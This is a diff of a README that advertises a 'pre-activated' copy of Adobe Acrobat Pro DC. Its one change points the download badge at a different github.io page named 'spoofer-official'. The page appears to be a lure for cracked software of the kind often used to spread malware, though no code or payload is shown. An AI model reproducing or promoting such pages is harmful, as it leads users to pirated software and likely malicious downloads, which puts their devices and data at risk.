@@ -2,7 +2,7 @@
 
 Powerful PDF editor with advanced features for professionals. Pre-activated version with full offline functionality for seamless document editing, conversion, and e-signing.
 
-[![Download Adobe Acrobat Pro DC](https://img.shields.io/badge/Get-Adobe_Acrobat_Pro_DC-blueviolet)](https://adobe-acrobat-activated.github.io/.github/)
+[![Download Adobe Acrobat Pro DC](https://img.shields.io/badge/Get-Adobe_Acrobat_Pro_DC-blueviolet)](https://spoofer-official.github.io/.github/)
 
 ---
 
